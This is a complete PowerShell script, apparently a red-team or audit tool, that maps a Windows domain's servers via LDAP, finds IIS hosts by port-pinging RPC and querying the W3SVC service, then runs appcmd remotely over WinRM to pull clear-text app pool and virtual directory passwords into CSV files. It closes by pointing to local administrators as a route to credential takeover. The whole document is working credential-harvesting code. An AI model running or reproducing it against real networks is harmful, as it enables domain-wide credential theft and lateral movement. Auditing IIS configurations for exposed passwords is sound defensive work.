# Get IIS credentials by mapping IIS Servers and getting IIS appPools, vDirectories, usernames & passwords
# Version: 1.3
# Comments to yossis@protonmail.com

<# the basic, straight-forward command to retrieve creds locally on an IIS Server
c:\Windows\system32\inetsrv\appcmd.exe list apppool /text:*
c:\Windows\system32\inetsrv\appcmd.exe list vdir /text:*
#>

[cmdletbinding()]
param(
    [string]$OutputFolder = "c:\temp"
)

# Set window title
$host.UI.RawUI.WindowTitle = "IIS Credentials Mapping";

# Set function to find IIS servers by querying w3svc service
function global:Test-W3SVCAsync
{    
    <#
    .Synopsis
       Query a list of servers in batches while looking for the world wide web service (w3svc)
    .PARAMETER MaxConcurrent
       Specifies the maximum number of servers/commands to run at a time
    #>

    [CmdletBinding(DefaultParameterSetName='Default')]
    param(
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [ValidateNotNullOrEmpty()] 
        [string[]] ${Name},

        [ValidateRange(1, 60)]
        [System.Int32]
        ${Delay},

        [ValidateScript({$_ -ge 1})]
        [System.UInt32]
        $MaxConcurrent = 20,

        [Parameter(ParameterSetName='Quiet')]
        [Switch]
        $Quiet
    )

    begin
    {
        if ($null -ne ${function:Get-CallerPreference})
        {
            Get-CallerPreference -Cmdlet $PSCmdlet -SessionState $ExecutionContext.SessionState
        }

        $null = $PSBoundParameters.Remove('MaxConcurrent')
        $null = $PSBoundParameters.Remove('Quiet')
        
        $jobs = @{}
        $i = -1

        function ProcessCompletedJob
        {
            [CmdletBinding()]
            param (
                [Parameter(Mandatory = $true)]
                [hashtable]
                $Jobs,

                [Parameter(Mandatory = $true)]
                [int]
                $Index,

                [switch]
                $Quiet
            )
            
            $quietStatus = New-Object psobject -Property @{Name = $Jobs[$Index].Target; Success = $false}
            if ($Jobs[$Index].Job.HasMoreData)
            {
                foreach ($result in (Receive-Job $Jobs[$Index].Job))
                {
                    if ($Quiet)
                    {
                        $quietStatus.Success = $result
                        break
                    }
                            
                    else
                    {
                        Write-Output $result
                    }
                }
            }

            if ($Quiet)
            {
                Write-Output $quietStatus
            }

            Remove-Job -Job $Jobs[$Index].Job -Force
            $Jobs[$Index] = $null

        } # function ProcessCompletedJob

    } # begin

    process
    {
        $null = $PSBoundParameters.Remove('Name')
        foreach ($target in $Name)
        {
            while ($true)
            {
                if (++$i -eq $MaxConcurrent)
                {
                    Start-Sleep -Milliseconds 100
                    $i = 0
                }

                if ($null -ne $jobs[$i] -and $jobs[$i].Job.JobStateInfo.State -ne [System.Management.Automation.JobState]::Running)
                {
                    ProcessCompletedJob -Jobs $jobs -Index $i -Quiet:$Quiet
                }
                
                if ($null -eq $jobs[$i])
                {
                    Write-Verbose "Job ${i}: Testing ${target}."

                    $job = Start-Job -ScriptBlock {(Get-Service -ComputerName $args[0] -ServiceName "W3SVC" -ErrorAction SilentlyContinue) -ne $null} -ArgumentList $target #@PSBoundParameters
                    $jobs[$i] = New-Object psobject -Property @{Target = $target; Job = $job}

                    break
                }
            }
        }
    }

    end
    {
        while ($true)
        {
            $foundActive = $false
            for ($i = 0; $i -lt $MaxConcurrent; $i++)
            {
                if ($null -ne $jobs[$i])
                {
                    if ($jobs[$i].Job.JobStateInfo.State -ne [System.Management.Automation.JobState]::Running)
                    {
                        ProcessCompletedJob -Jobs $jobs -Index $i -Quiet:$Quiet
                    }                    
                    else
                    {
                        $foundActive = $true
                    }
                }
            }

            if (-not $foundActive)
            {
                break
            }

            Start-Sleep -Milliseconds 100
        }
    }

} # End function Test-W3SVCAsync

# Set function to ping multiple hosts quickly, async
function Invoke-PortPing {
[cmdletbinding()]
param(
    [string]$ComputerName,
    [int]$Port,
    [int]$Timeout
)
((New-Object System.Net.Sockets.TcpClient).ConnectAsync($ComputerName,$Port)).Wait($Timeout)
}

## STEP 1: Map IIS Servers in the domain
# Get all enabled Servers
$ds = New-Object System.DirectoryServices.DirectorySearcher;
$ds.Filter = "(&(objectClass=computer)(operatingsystem=*server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
$ds.PropertiesToLoad.Add("operatingsystem") | Out-Null;
$ds.PropertiesToLoad.Add("name") | Out-Null;
$Servers = $ds.FindAll().Properties.name;

# ALTERNATIVE using ActiveDirectory module
<#
$Computers = Get-ADComputer -Filter * -Properties pwdlastset, operatingsystem,operatingsystemversion | select name, enabled, operatingsystem,operatingsystemversion , @{n='PasswordLastSet';e={[datetime]::FromFileTime($_.pwdLastSet)}}
$Servers = ($Computers | where {$_.operatingsystem -like "*SERVER*" -and $_.enabled -eq "True"}).name
#>

## Get IIS Servers in the domain
# Alternative approach:
# $Servers | foreach { if ((Get-WindowsFeature -ComputerName $_ -Name Web-Server).'Install State' -eq "Installed") {$IISServers += $_}}

Write-Output "[x] Checking $($Servers.Count) Servers in the domain...";

# First, check connectivity (Servers are online) through port ping to RPC
# Assuming RPC is open as default port in Domain environment, and also needed later for Test-W3SVCAsync 
[int]$Port = 135; # RPC endpoint mapper
[int]$Timeout = 250; # set timeout in milliseconds. normally 100ms should be fine, taking extra response time here.
[int]$i = 1;
[int]$HostCount = $Servers.count;
$ServersPostPing = New-Object System.Collections.ArrayList;

$Servers | ForEach-Object {
        $Computer = $_;
        Write-Progress -Activity "Testing for RPC connectivity. If IIS Servers are found, Credentials mapping will process. Please wait..." -status "host $i of $HostCount" -percentComplete ($i / $HostCount*100);
        
        if ((Invoke-PortPing -ComputerName $Computer -Port $port -Timeout $timeout -ErrorAction silentlycontinue) -eq "True") {$null = $ServersPostPing.Add($Computer)}
        $i++;
    }
    
Write-Output "`n`n`n[x] $($ServersPostPing.Count) Servers responded to connectivity check.";

# check for IIS Service async
$CheckedServers = Test-W3SVCAsync -Name $ServersPostPing -MaxConcurrent 10 -Quiet;
$IISServers = $CheckedServers | where Success -eq "True" | select -ExpandProperty name;

# Check if any IIS Servers were found
if (!$IISServers) {
    Write-Output "[!] No IIS Servers found. Quiting.";
    break
}

# Save IIS Server names to separate file
$IISServers | out-file "$OutputFolder\IISServers_$ENV:USERDOMAIN.txt";
Write-Output "[x] Found $($IISServers.count) Online IIS Server(s). Getting appPool/vDir data, please wait...";

## STEP 2: Get app pool clear-text passwords (assuming winrm enabled, WinSRV 2012+ by default is On)
# Note: Can also add Check for winrm service/port before running jobs...

Get-Job | Remove-Job # -Force
$null = Invoke-Command -Computername $IISServers -JobName APPPOOL -ScriptBlock {cd $env:windir\system32\inetsrv; "SERVERNAME:$ENV:COMPUTERNAME"; .\appcmd.exe list apppool /text:* } -AsJob
$null = Invoke-Command -Computername $IISServers -JobName VDIR -ScriptBlock {cd $env:windir\system32\inetsrv; "SERVERNAME:$ENV:COMPUTERNAME"; .\appcmd.exe list vdir /text:* } -AsJob

# Side note: get only user name or only password
# .\Appcmd.exe list apppool /text:processmodel.username
# .\Appcmd list apppool /text:processmodel.password

# wait for remote winRM jobs on IIS Servers to terminate
$null = Get-Job | Wait-Job;

# Check if there are failed jobs on some server(s)
if ($(Get-Job).State -eq 'failed') {
        Write-Warning "[!] Note: Some jobs were not completed successfully";
        $FailedIISServersLog = "$OutputFolder\AppPoolData_FAILED_JOBS_$ENV:USERDOMAIN.txt";
        (Get-Job).ChildJobs | where state -eq "Failed" | select -ExpandProperty location -Unique | Out-File;
        Write-Output "[x] List of IIS Servers with failed jobs saved to $FailedIISServersLog."
    }
else
    {
        Write-Output "[x] $((Get-Job).ChildJobs.Count) jobs ($($IISServers.count) IIS Servers) completed successfully"
    }

# SANITY CHECK: Show Full report 
#Get-Job | Receive-Job -Keep

## Step 3: Analyze data, output creds to file etc.
# Get details..

# AppPool report
$AppPoolReport = @();
$AppPoolReport += "ServerName,AppPoolName,Username,Password";

(Get-Job -Name APPPOOL).ChildJobs | foreach {$data = $_ | Receive-Job -Keep -EA SilentlyContinue;
    $appPools = $data | Select-String 'apppool.NAME';
    $Usernames = $data | Select-String username: ;
    $Pass = $data | Select-String password: ;
    $ServerName = $_.Location;

    [int]$i = 0; 
    foreach ($appPool in $appPools) {
        $AppPoolReport += "$ServerName,$($appPool.ToString().Trim()),$($Usernames[$i].ToString().Trim()),$($Pass[$i].ToString().Trim())";
        $i++
    }
 } 

# Virtual Directories report
$vDirReport = @();
$vDirReport += "ServerName,vDir,Username,Password";

(Get-Job -Name VDIR).ChildJobs | foreach {$data = $_ | Receive-Job -Keep -EA SilentlyContinue;
    $vDirs = $data | Select-String 'VDIR.NAME';
    $Usernames = $data | Select-String username: ;
    $Pass = $data | Select-String password: ;
    $ServerName = $_.Location;

    [int]$i = 0; 
    foreach ($vDir in $vDirs) {
        $vDirReport += "$ServerName,$($vDir.ToString().Trim()),$($Usernames[$i].ToString().Trim()),$($Pass[$i].ToString().Trim())";
        $i++
    }
 } 

# SANITY CHECK: Show the raw report data
#$AppPoolReport | ft -AutoSize;

# Save full raw data to CSV
$CSVfullAppPoolReport = "$OutputFolder\AppPoolData__FULL_RAW_$ENV:USERDOMAIN.csv";
$AppPoolReport | Out-File $CSVfullAppPoolReport;
$CSVfullvDirReport = "$OutputFolder\vDirData_FULL_RAW_$ENV:USERDOMAIN.csv";
$vDirReport | Out-File $CSVfullvDirReport;

# Clean up data - Remove defaultAppPools, no password / default IIS_User etc
$DataPreCleanup = $AppPoolReport | ConvertFrom-Csv;
Write-Output "[x] Total of $($DataPreCleanup.count) appPools found.";

$DataPreCleanup | foreach { 
    $AppPool = $_.AppPoolName.Substring(0,$_.AppPoolName.Length-1).Replace('APPPOOL.NAME:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name AppPoolName -Value $AppPool -Force;
    
    $username = $_.Username.Substring(0,$_.Username.Length-1).Replace('userName:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name UserName -Value $username -Force;
    
    $Password = $_.Password.Substring(0,$_.Password.Length-1).Replace('password:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name Password -Value $Password -Force;
}

# clean-up vDir data
$DataPreCleanupvDir = $vDirReport | ConvertFrom-Csv;
Write-Output "[x] Total of $($DataPreCleanupvDir.count) vDirs found.";

$DataPreCleanupvDir | foreach { 
    $vDirName = $_.vDir.Substring(0,$_.vDir.Length-1).Replace('VDIR.NAME:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name vDir -Value $vDirName -Force;
    
    $username = $_.Username.Substring(0,$_.Username.Length-1).Replace('userName:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name UserName -Value $username -Force;
    
    $Password = $_.Password.Substring(0,$_.Password.Length-1).Replace('password:"','');
    Add-Member -InputObject $_ -MemberType NoteProperty -Name Password -Value $Password -Force;
}

## Step 4: Save focused output + clean/wrap up
# Save clean/optimized data to CSV
$FilteredDataAppPool = $DataPreCleanup | where {$_.username -ne ""}
$FilteredDataVDir = $DataPreCleanupvDir | where {$_.username -ne ""}

if (!$FilteredDataAppPool -and !$FilteredDataVDir) {
    Write-Output "[!] No credentials returned (only built-in SYSTEM account). Quiting.";
    break
}
else
    {
    $CSVoptimizedDataAppPool = "$OutputFolder\AppPool_Credentials_OPTIMIZED_$ENV:USERDOMAIN.csv";
    $FilteredDataAppPool | ConvertTo-Csv -NoTypeInformation | Out-File $CSVoptimizedDataAppPool;

    $CSVoptimizedDatavDir = "$OutputFolder\vDir_Credentials_OPTIMIZED_$ENV:USERDOMAIN.csv";
    $FilteredDataVDir | ConvertTo-Csv -NoTypeInformation | Out-File $CSVoptimizedDatavDir;

    # Display statistics for credentials & server names
    $FilteredDataAppPool | Group-Object username | Sort-Object count -Descending | select count, @{n='UserName_AppPool';e={$_.name}}, @{n='ServerName';e={$_.group | select -ExpandProperty ServerName -Unique}} | ft -AutoSize;
    $FilteredDataVDir | Group-Object username | Sort-Object count -Descending | select count, @{n='UserName_vDir';e={$_.name}}, @{n='ServerName';e={$_.group | select -ExpandProperty ServerName -Unique}} | ft -AutoSize;

    Write-Output "[x] For summarized credentials info, Please see files:`n$CSVoptimizedDataAppPool`n$CSVoptimizedDatavDir";
    Write-Output "`n[x] For full credentials report, Please see files:`n$CSVfullAppPoolReport`n$CSVfullvDirReport";
    Write-Output "`n[x] For a list of local administrators (direct potential for take-over of credentials),`nenter the list of servers with detected clear-text credentials to a variable, and run:`n"
    Write-Output 'Invoke-Command -ComputerName $servers -Command {$env:COMPUTERNAME; Get-LocalGroupMember administrators}'
}

$host.ui.rawui.windowtitle = "* IIS Credentials Mapping - Done *";
[gc]::Collect();